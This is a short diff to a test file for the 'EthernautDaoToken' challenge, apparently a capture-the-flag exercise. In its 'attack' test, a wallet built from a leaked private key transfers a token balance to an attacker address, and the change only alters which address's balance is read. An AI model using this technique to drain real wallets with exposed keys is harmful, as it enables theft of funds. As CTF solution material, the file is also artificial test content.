@@ -30,7 +30,7 @@ describe('EthernautDaoToken', () => {
   it('attack', async () => {
     const wallet = new Wallet(privateKey, provider);
 
-    const walletBalance = await target.balanceOf(wallet.address);
+    const walletBalance = await target.balanceOf(addressWithBalance);
 
     await (await target.connect(wallet).transfer(attacker.address, walletBalance)).wait();
 
@@ -38,6 +38,6 @@ describe('EthernautDaoToken', () => {
       utils.formatEther(walletBalance)
     );
 
-    expect(utils.formatEther(await target.balanceOf(wallet.address))).to.equal('0.0');
+    expect(utils.formatEther(await target.balanceOf(addressWithBalance))).to.equal('0.0');
   });
 });
